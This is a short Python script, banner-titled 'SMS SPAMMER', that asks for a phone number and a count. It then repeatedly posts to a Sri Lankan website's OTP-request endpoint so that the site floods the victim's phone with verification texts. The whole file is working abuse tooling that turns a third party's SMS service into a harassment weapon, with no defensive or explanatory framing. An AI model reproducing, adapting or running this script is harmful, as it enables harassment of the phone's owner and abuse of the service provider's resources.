import requests
import pyfiglet
ascii_banner = pyfiglet.figlet_format("SMS SPAMMER")
print(ascii_banner)
a = input("Enter Mobile Number : ")
b = int(input("No Of Messages : "))
data = {
    'serviceNum': a,
     }
for i in range (b):
    response = requests.post('https://www.datamart.lk/home/otpForViewUsage', data=data) 
print("Spam Send Successfully..")
print("Coded By Teshan Pamodya")
input("Press Enter For Exit The Program")
